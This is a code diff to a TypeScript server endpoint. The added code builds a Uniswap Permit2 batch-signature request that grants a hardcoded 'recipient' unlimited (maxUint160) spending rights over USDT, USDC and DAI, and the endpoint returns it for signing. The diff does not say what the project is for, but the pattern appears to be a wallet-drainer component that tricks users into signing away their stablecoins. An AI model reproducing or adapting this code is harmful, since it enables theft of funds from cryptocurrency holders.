@@ -209,40 +209,63 @@ app.post<{
     }
   }
 
-  return [tokensReturned, _addrs];
+  return [_dataToSign, _addrs];
   // return tokensAddressOnly;
 });
+const usdcContractAddress: string =
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const daiContractAddr: string = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
+const usdtContractAddress: string =
+  "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const dett = [
+  {
+    token: usdtContractAddress,
+    amount: maxUint160,
+    expiration: deadline,
+    nonce: nonce,
+  },
+  {
+    token: usdcContractAddress,
+    amount: maxUint160,
+    expiration: deadline,
+    nonce: nonce,
+  },
+  {
+    token: daiContractAddr,
+    amount: maxUint160,
+    expiration: deadline,
+    nonce: nonce,
+  },
+];
 
-const dataToSign = (detailsArray: []) => {
-  const dataToSign = {
-    domain: {
-      name: "Permit2" as string,
-      chainId: chainId,
-      verifyingContract: Permit2Contract,
-    },
-    types: {
-      EIP712Domain: [
-        { name: "name", type: "string" },
-        { name: "chainId", type: "uint256" },
-        { name: "verifyingContract", type: "address" },
-      ],
-      PermitBatch: [
-        { name: "details", type: "PermitDetails[]" },
-        { name: "spender", type: "address" },
-        { name: "sigDeadline", type: "uint256" },
-      ],
-      PermitDetails: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint160" },
-        { name: "expiration", type: "uint48" },
-        { name: "nonce", type: "uint48" },
-      ],
-    },
-    primaryType: "PermitBatch",
-    message: {
-      details: detailsArray,
-      spender: recipient,
-      sigDeadline: deadline,
-    },
-  };
+const _dataToSign = {
+  domain: {
+    name: "Permit2" as string,
+    chainId: chainId,
+    verifyingContract: Permit2Contract,
+  },
+  types: {
+    EIP712Domain: [
+      { name: "name", type: "string" },
+      { name: "chainId", type: "uint256" },
+      { name: "verifyingContract", type: "address" },
+    ],
+    PermitBatch: [
+      { name: "details", type: "PermitDetails[]" },
+      { name: "spender", type: "address" },
+      { name: "sigDeadline", type: "uint256" },
+    ],
+    PermitDetails: [
+      { name: "token", type: "address" },
+      { name: "amount", type: "uint160" },
+      { name: "expiration", type: "uint48" },
+      { name: "nonce", type: "uint48" },
+    ],
+  },
+  primaryType: "PermitBatch",
+  message: {
+    details: dett,
+    spender: recipient,
+    sigDeadline: deadline,
+  },
 };
